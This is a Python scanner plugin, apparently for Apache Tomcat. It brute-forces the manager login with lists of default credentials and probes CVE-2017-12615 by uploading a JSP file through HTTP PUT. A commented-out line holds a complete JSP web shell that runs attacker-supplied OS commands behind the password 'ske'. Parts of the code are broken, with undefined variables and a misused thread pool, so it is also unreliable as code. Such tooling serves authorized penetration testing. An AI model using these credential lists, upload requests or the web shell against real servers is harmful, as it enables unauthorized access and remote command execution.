#coding=utf-8
import urllib.request, urllib.error, urllib.parse
import base64
import requests
import uuid
from termcolor import cprint
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
def requests_post(url,username,password,flag_list):
    try:
        login_url = url + '/manager/html'
        auth_str_temp = user + ':' + password
        auth_str_temp = bytes(auth_str_temp, encoding="utf8")
        auth_str = base64.b64encode(auth_str_temp)
        auth_str = str(auth_str, encoding="utf8")
        headers = {'Authorization': 'Basic ' + auth_str}
        res = requests.post(url=login_url, headers=headers, timeout=config.Timeout)
        success_num=0
        for flag in flag_list:
            if flag in res_html:
                success_num=success_num+1
                info = '%s Tomcat Weak password %s:%s' % (login_url, user, password)
        if success_num>0:
            print(info)
    except Exception:
        pass
def crack_password(arg,config):
    url = "http://%s"%(arg.url)
    print("对tomcat weak password 进行检测")
    flag_list=['Application Manager','Welcome']
    user_list=['admin','manager','tomcat','apache','root']
    pass_list=['','123456','12345678','123456789','admin123','123123','admin888','password','admin1','administrator','8888888','123123','admin','manager','tomcat','apache','root']
    with ThreadPoolExecutor(config.ThreadNum) as excetor:
        for user in user_list:
            for password in pass_list:
                try:
                    excetor.submit(requests_post(arg.url, user, password, flag_list))
                except Exception:
                    pass


'''
http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html
https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5
https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e
'''
#脚本来自：https://github.com/SkewwG/VulScan/blob/master/tomcat/cve-12615.py
class Exploit:
    def attack(self, url):
        uu = uuid.uuid4()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }

        # body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
        # +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("ske".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
        body = '''<%out.print("test");%>'''
        url_parse = urlparse(url)
        url = r'http://' + url if url_parse.scheme == '' else url
        put_url = r'{}/{}.jsp/'.format(url,uu)
        try:
            res = requests.put(put_url,data=body,headers=headers)
            code = res.status_code
            if code == 201:
                print('[+]access : {}'.format(put_url[:-1]))
                access_url = put_url[:-1]
                whoami = requests.get(access_url).text
                if r"test" in whoami:
                    print("[+]存在Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）漏洞...(高危)\tpayload: " + access_url)
                else:
                    print("[+]不存在Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）漏洞...(高危)")
            else:
                return None
        except Exception as e:
            cprint("[-] " + __file__ + "====>连接超时", "cyan")

def tomcat_special_plugin_(arg,config):
    Exploit().attack(arg.url)
    crack_password(arg,config)

